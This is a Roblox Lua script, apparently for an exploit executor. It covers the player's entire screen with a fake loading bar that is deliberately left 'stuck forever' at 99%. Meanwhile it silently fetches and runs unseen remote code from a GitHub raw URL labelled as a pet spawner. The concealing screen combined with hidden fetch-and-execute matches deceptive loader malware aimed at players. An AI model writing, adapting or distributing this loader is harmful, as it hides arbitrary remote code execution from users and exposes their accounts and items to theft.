-- Fullscreen GUI
local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
gui.Name = "FullScreenLoading"

local bg = Instance.new("Frame", gui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
bg.BorderSizePixel = 0

local loadingText = Instance.new("TextLabel", bg)
loadingText.Size = UDim2.new(1, 0, 0.1, 0)
loadingText.Position = UDim2.new(0, 0, 0.4, 0)
loadingText.BackgroundTransparency = 1
loadingText.TextColor3 = Color3.new(1, 1, 1)
loadingText.TextScaled = true
loadingText.Font = Enum.Font.GothamBold
loadingText.Text = "🌱 Loading... 1%"

local barBackground = Instance.new("Frame", bg)
barBackground.Size = UDim2.new(0.6, 0, 0.05, 0)
barBackground.Position = UDim2.new(0.2, 0, 0.52, 0)
barBackground.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barBackground.BorderSizePixel = 0
barBackground.ClipsDescendants = true

local fillBar = Instance.new("Frame", barBackground)
fillBar.Size = UDim2.new(0, 0, 1, 0)
fillBar.Position = UDim2.new(0, 0, 0, 0)
fillBar.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
fillBar.BorderSizePixel = 0

-- Animate loading from 1% to 99%
task.spawn(function()
    for i = 1, 99 do
        fillBar.Size = UDim2.new(i / 100, 0, 1, 0)
        loadingText.Text = "🌱 Loading... " .. i .. "%"
        wait(0.05)
    end
    loadingText.Text = "🌱 Loading... 99%" -- stuck forever
end)

-- Load your spawner silently in the background
task.spawn(function()
    local success, spawner = pcall(function()
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/Pragsz868/PetSpawnerScript/refs/heads/main/d4b102da3a53b9ef4b29251678adfba2.txt"))()
    end)
    if not success then
        warn("Failed to load spawner.")
    end
end)
